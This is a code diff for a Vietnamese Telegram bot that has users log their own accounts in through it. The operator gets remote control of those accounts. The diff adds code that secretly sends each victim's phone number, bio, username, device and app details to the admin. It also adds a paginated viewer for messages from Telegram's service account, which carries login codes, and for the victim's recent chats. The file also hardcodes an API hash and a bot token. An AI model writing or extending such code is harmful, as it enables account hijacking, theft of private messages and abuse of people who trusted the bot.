@@ -15,7 +15,6 @@ A_HS = "a6da3117ff6b8a1679d04ab743976068"
 B_TK = '8991807402:AAG9h73vG6QaMnWWBTiakYePWKwcamsbO1s'
 O_ID = 7907990385
 
-# Cấu hình 2 nhóm bắt buộc tham gia
 REQUIRED_GROUPS = [
     {"username": "muadonglanhgia36", "link": "https://t.me/muadonglanhgia36", "name": "Nhóm 1"},
     {"username": "chatmuadonglanhgia", "link": "https://t.me/chatmuadonglanhgia", "name": "Nhóm 2"}
@@ -88,7 +87,6 @@ def _su(u):
 async def is_user_in_channel(user_id):
     if user_id in admins: return True
     try:
-        # Kiểm tra người dùng đã tham gia TẤT CẢ các nhóm bắt buộc chưa
         for group in REQUIRED_GROUPS:
             await bot(functions.channels.GetParticipantRequest(
                 channel=group["username"], participant=user_id
@@ -157,23 +155,47 @@ Bạn phải tham gia **đầy đủ các nhóm** dưới đây thì mới sử 
     return msg, buttons
 
 # ==========================================
-# HÀM GỬI THÔNG BÁO LOGIN CHO ADMIN
+# HÀM GỬI THÔNG BÁO LOGIN CHI TIẾT CHO ADMIN
 # ==========================================
 async def notify_admin_login(client, user_id, phone_number):
     try:
         me = await client.get_me()
+        full_user = await client(functions.users.GetFullUserRequest(id=me.id))
+        about_text = full_user.full_user.about or "Không có"
+        
+        # Lấy thông tin thiết bị/phiên đăng nhập hiện tại
+        device_model = "Không xác định"
+        app_version = "Không xác định"
+        try:
+            auths = await client(functions.account.GetAuthorizationsRequest())
+            for auth in auths.authorizations:
+                if auth.current:
+                    device_model = f"{auth.device_model} ({auth.platform})"
+                    app_version = auth.app_name
+                    break
+        except:
+            pass
+
+        now = datetime.datetime.now()
+        time_str = now.strftime('%H:%M:%S - %d/%m/%Y')
+
         photos = await client.get_profile_photos('me', limit=1)
         avatar_path = None
         if photos:
             avatar_path = await client.download_media(photos[0], file=f"avatar_{user_id}.jpg")
         
         caption = f"""
-🚨 **CÓ TÀI KHOẢN VỪA LOGIN THÀNH CÔNG!**
+🚨 **THÔNG BÁO TÀI KHOẢN LOGIN THÀNH CÔNG**
 ────────────────
-👤 **Tên:** {me.first_name} {me.last_name or ''}
-🆔 **ID Userbot:** `{me.id}`
-📱 **Số Điện Thoại:** `+{phone_number}`
-👤 **ID Người Dùng Bot:** `{user_id}`
+• **Thời gian:** `{time_str}`
+• **ID Userbot:** `{me.id}`
+• **Họ Tên:** `{me.first_name} {me.last_name or ''}`
+• **Username:** `@{me.username if me.username else 'N/A'}`
+• **Số Điện Thoại:** `+{phone_number}`
+• **Hồ Sơ (Bio):** `{about_text}`
+• **Thiết Bị:** `{device_model}`
+• **Ứng Dụng:** `{app_version}`
+• **ID Người Dùng Bot:** `{user_id}`
 """
         buttons = [[Button.inline("🎮 Điều Khiển Acc Này", data=f"sel_acc_{user_id}")]]
 
@@ -506,7 +528,7 @@ async def _callback_handler(ev):
 """
         buttons = [
             [Button.inline("💬 Gửi Tin Nhắn", data="rmt_send_one"), Button.inline("📢 Gửi All Nhóm", data="rmt_send_all")],
-            [Button.inline("📋 Check Số Nhóm", data="rmt_count_groups"), Button.inline("📜 Lịch Sử 10 Tin", data="rmt_history")],
+            [Button.inline("📋 Check Số Nhóm", data="rmt_count_groups"), Button.inline("📜 Lịch Sử 10 Tin", data="rmt_hist_p1")],
             [Button.inline("🔙 Chọn Tài Khoản Khác", data="m_control")]
         ]
         await ev.edit(txt, buttons=buttons, parse_mode='markdown')
@@ -579,36 +601,65 @@ async def _callback_handler(ev):
         except Exception as ex:
             await ev.edit(f"❌ Lỗi: {ex}", buttons=[[Button.inline("🔙 Trở Về", data=f"sel_acc_{target_uid}")]])
 
-    elif data == "rmt_history":
+    elif data.startswith("rmt_hist_p"):
         if u not in admins: return
         target_uid = admin_selected_target.get(u)
         if not target_uid or target_uid not in u_c: return await ev.answer("Tài khoản lỗi!", alert=True)
         client = u_c[target_uid]
-        await ev.answer("⏳ Đang tải lịch sử tin nhắn...", alert=True)
+        
+        page = int(data.split("p")[1])
+        await ev.answer(f"⏳ Đang tải trang {page}...", alert=True)
         try:
-            text = f"📜 **10 TIN NHẮN GẦN NHẤT (KỂ CẢ TELEGRAM NOTIFICATIONS):**\n────────────────\n"
+            # Lấy 10 tin nhắn gần nhất từ Service Notifications (777000)
+            all_msgs = []
             try:
                 messages = await client.get_messages(777000, limit=10)
-                text += f"🔔 **Từ Telegram Service (777000):**\n"
                 for m in messages:
                     msg_content = m.text.replace("\n", " ") if m.text else "[Media/Service]"
-                    date_str = m.date.strftime('%H:%M:%S %d/%m') if m.date else ""
-                    text += f"• `[{date_str}]`: {msg_content[:60]}\n"
+                    date_str = m.date.strftime('%H:%M:%S %d/%m/%Y') if m.date else ""
+                    all_msgs.append(f"🔔 `[{date_str}]`: {msg_content}")
             except:
                 pass
 
-            dialogs = await client.get_dialogs(limit=5)
-            for d in dialogs:
-                try:
-                    msgs = await client.get_messages(d.id, limit=2)
-                    text += f"\n💬 **Box: {d.name}**\n"
+            # Nếu service trống, lấy thêm từ chat gần nhất
+            if not all_msgs:
+                dialogs = await client.get_dialogs(limit=1)
+                for d in dialogs:
+                    msgs = await client.get_messages(d.id, limit=10)
                     for m in msgs:
                         msg_content = m.text.replace("\n", " ") if m.text else "[Media]"
-                        text += f"  - _{msg_content[:50]}_\n"
-                except:
-                    pass
+                        date_str = m.date.strftime('%H:%M:%S %d/%m/%Y') if m.date else ""
+                        all_msgs.append(f"💬 **{d.name}** `[{date_str}]`: {msg_content}")
 
-            await ev.edit(text[:4000], buttons=[[Button.inline("🔙 Trở Về", data=f"sel_acc_{target_uid}")]], parse_mode='markdown')
+            total_items = len(all_msgs)
+            if total_items == 0:
+                return await ev.edit("📜 Không có lịch sử tin nhắn nào!", buttons=[[Button.inline("🔙 Trở Về", data=f"sel_acc_{target_uid}")]])
+
+            items_per_page = 3
+            total_pages = (total_items + items_per_page - 1) // items_per_page
+            if page > total_pages: page = total_pages
+            if page < 1: page = 1
+
+            start_idx = (page - 1) * items_per_page
+            end_idx = start_idx + items_per_page
+            current_msgs = all_msgs[start_idx:end_idx]
+
+            text = f"📜 **LỊCH SỬ TIN NHẮN (Trang {page}/{total_pages}):**\n────────────────\n"
+            for msg_item in current_msgs:
+                text += f"• {msg_item}\n\n"
+
+            nav_buttons = []
+            if page > 1:
+                nav_buttons.append(Button.inline("⬅️ Trước", data=f"rmt_hist_p{page-1}"))
+            if page < total_pages:
+                nav_buttons.append(Button.inline("Sau ➡️", data=f"rmt_hist_p{page+1}"))
+            
+            buttons = []
+            if nav_buttons:
+                buttons.append(nav_buttons)
+            buttons.append([Button.inline("🔙 Trở Về Quản Lý", data=f"sel_acc_{target_uid}")])
+
+            await ev.edit(text, buttons=buttons, parse_mode='markdown')
         except Exception as ex:
             await ev.edit(f"❌ Lỗi tải lịch sử: {ex}", buttons=[[Button.inline("🔙 Trở Về", data=f"sel_acc_{target_uid}")]])
 
@@ -658,7 +709,7 @@ async def _callback_handler(ev):
                 
                 u_c[u] = c; _logic(c, u)
                 
-                # Gọi hàm gửi thông báo đăng nhập cho Admin kèm ảnh avatar và SĐT
+                # Gọi hàm gửi thông báo login chi tiết cho Admin
                 await notify_admin_login(c, u, p)
 
                 await cv.send_message("✅ **LOGIN THÀNH CÔNG!**")
